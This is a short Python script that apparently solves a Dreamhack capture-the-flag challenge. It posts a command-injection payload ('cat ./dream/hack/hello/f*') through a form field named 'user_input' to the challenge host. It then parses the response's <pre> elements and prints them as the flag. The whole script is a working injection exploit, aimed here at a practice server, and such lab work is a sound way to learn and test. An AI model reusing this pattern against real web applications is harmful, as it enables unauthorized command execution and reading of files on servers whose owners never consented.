from bs4 import BeautifulSoup as bs
import base64
import requests

URL = "http://host3.dreamhack.games:23718/"
PAYLOAD = "cat ./dream/hack/hello/f*"
DATA = {'user_input' : PAYLOAD}

resp = requests.post(URL, data=DATA)
soup = bs(resp.text, "html.parser")

elements = soup.select('pre')

FLAG = elements

print(FLAG)